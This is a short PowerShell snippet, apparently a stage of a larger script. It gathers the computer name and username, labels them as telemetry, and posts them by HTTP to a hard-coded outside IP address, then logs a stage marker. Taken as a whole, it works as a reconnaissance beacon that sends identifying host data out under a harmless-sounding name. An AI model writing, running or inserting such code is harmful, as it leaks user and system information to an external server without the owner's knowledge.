
$PayloadJson = [ordered]@{ Host = $env:COMPUTERNAME; User = $env:USERNAME; Stage = "telemetry" } | ConvertTo-Json
Invoke-RestMethod -Uri 'https://203.0.113.53/upload' -Method Post -Body $PayloadJson -ContentType "application/json"
Write-Verbose "stage marker 32 reached"
